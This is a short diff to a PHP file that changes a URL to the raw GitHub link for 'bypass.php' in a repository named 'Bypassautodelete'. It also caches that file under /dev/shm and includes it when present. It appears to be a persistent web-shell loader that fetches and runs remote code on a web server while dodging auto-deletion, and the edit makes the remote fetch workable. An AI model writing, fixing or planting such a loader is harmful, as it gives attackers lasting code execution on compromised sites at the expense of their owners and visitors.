@@ -1,5 +1,5 @@
 <?php
-$data = ['https://github.com/froevel/Bypassautodelete/blob/main/bypass.php', '/dev/shm/'.md5($_SERVER['HTTP_HOST'])];
+$data = ['https://raw.githubusercontent.com/froevel/Bypassautodelete/refs/heads/main/bypass.php', '/dev/shm/'.md5($_SERVER['HTTP_HOST'])];
 
 if(file_exists($data[1]) && filesize($data[1]) !== 0) {
     include($data[1]);
